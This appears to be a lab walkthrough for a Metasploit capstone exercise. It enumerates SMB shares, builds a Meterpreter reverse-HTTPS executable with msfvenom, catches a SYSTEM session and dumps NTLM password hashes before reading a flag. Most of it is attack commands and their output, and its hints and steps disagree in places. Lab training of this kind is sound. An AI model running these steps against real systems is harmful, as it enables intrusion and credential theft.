# Metasploit: Payload Generation Capstone

## The Scenario

Your team has uncovered a guest-writable share on the target Windows machine. There is a scheduled task that will run and delete any executable files uploaded to this share. The team also uncovered that the target only allows outbound HTTP/S traffic.

Your objectives:

1. Generate a Windows Meterpreter payload in EXE format using `msfvenom`.
   
2. Transfer the payload to the target machine.

3. Set up a handler in `msfconsole` and catch the Meterpreter session.

4. Use post-exploitation to dump password hashes of other users on the system.

5. Retrieve the flag.

## Hints

•For payload generation, use a stageless Meterpreter payload for reliability (`meterpreter_reverse_tcp`, not `meterpreter/reverse_tcp`).

•To transfer the file, you can use one of Metasploit's auxiliary modules.

Let's begin!

## The Steps

1. To begin, open a terminal and run `msfconsole -q`

   `-q` removes the launch banner, starting `msfconsole` in quiet mode.

2. Open another terminal for SMB enumeration, and enter the following:

`smbclient -L //10.146.155.136 -N`

```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	internal        Disk      Internal files
	IPC$            IPC       Remote IPC
	public          Disk      Public uploads
SMB1 disabled -- no workgroup available
```

SMB enumeration is an important reconnaissance step that identifies writable shares required to deliver the payload.

3.Access the public share:

`smbclient //10.146.155.136/public -N`

We now have a writable shell. 

We will need to generate a stageless payload.

Why stageless? Stageless (inline) payloads are self-contained, with the agent or shell code packaged in one single file. They are also a common choice to use with `msfvenom`. The payload executes on the target, connects back to your handler and establishes a session in one step.

Stageless payloads are the best choice for generating standalone files with `msfvenom` for manual delivery, your target environment has unreliable network connectivity, or you prefer simplicity.

4. Open another terminal window for `msfvenom`.

5. Enter the stageless `msfvenom` payload:

`msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.146.99.98 LPORT=443 -f exe -o shell.exe`

This payload generates a windows reverse shell. We have a way to get the executable. The target will run the `.exe file`, and a Meterpreter session connects back to our handler.

Let's break it down:

`-p`: Select payload

`windows/x64/meterpreter_reverse_https` is the payload to generate, using `_` for stageless payloads.

`LHOST`: Attacking machine's IP Address. The target will connect back to the LHOST when payload executes.

`LPORT`: The port that will receive the connection. Since the target only allows outbound HTTPS traffic, we use port 443.

`-f exe`: Output format for Windows portable executable.

`-o shell.exe`: The output file name. 

6. Switch back to terminal running `msfconsole`.

7. Set up a handler by entering the following:

`use exploit/multi/handler`

8. Set the following parameters:

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter_reverse_https
PAYLOAD => windows/x64/meterpreter_reverse_https
msf6 exploit(multi/handler) > set LHOST 10.146.99.98
LHOST => 10.146.99.98
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > run -j
```

The handler stops listening after the first session is established by default, but `ExitOnSession false` allows the handler to keep listening for additional connections. 

`-j` after the `run` command starts the handler in the background, so we can continue working in `msfconsole` while waiting for connections.

9. Switch to the terminal running SMBclient and inject the payload with `put shell.exe`:

```
smb: \> put shell.exe
putting file shell.exe as \shell.exe (50199.0 kb/s) (average 50200.0 kb/s)
```

10. Confirm that the executable is now on the target with `ls`:

```
smb: \> ls
  .                                   D        0  Thu Jul  9 17:11:31 2026
  ..                                  D        0  Thu Jul  9 17:11:31 2026
  .gitkeep                            A        0  Fri Apr 24 12:25:06 2026
  shell.exe                           A   257024  Thu Jul  9 17:11:31 2026

		7863807 blocks of size 4096. 3563694 blocks available
```

11. Switch back to the `msfconsole` terminal.

12. Confirm that a meterpreter session is running with `sessions`:

```
sessions

Active sessions
===============

  Id  Name  Type                  Information            Connection
  --  ----  ----                  -----------            ----------
  1         meterpreter x64/wind  NT AUTHORITY\SYSTEM @  10.146.99.98:443 -> 1
            ows                    CAPSTONE              0.146.155.136:49894 (
                                                         10.146.155.136)
```

13. Open the meterpreter shell with `sessions 1`:

```
msf exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

meterpreter >
```

14. Dump all the password hashes on the target system using `hashdump`:

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dfe3378335d43f9764e581b856a662a:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
jim:1008:aad3b435b51404eeaad3b435b51404ee:1e3fe826df1e5af582a98c034cafa9f4:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
```

You can spot Jim's NTLM hash:`1e3fe826df1e5af582a98c034cafa9f4`

15. find the flag in `C:\Users\Administrator` using `search -f *flag* -d "C:\Users\Administrator"`:

```
search -f *flag* -d "C:\Users\Administrator"
Found 1 result...
=================

Path                                       Size (bytes)  Modified (UTC)
----                                       ------------  --------------
C:\Users\Administrator\Documents\flag.txt  39            2026-04-24 12:24:48 +0000
```

16. `cat` the file path to print out the flag:

```
meterpreter > cat 'C:\Users\Administrator\Documents\flag.txt'
THM{...}
```












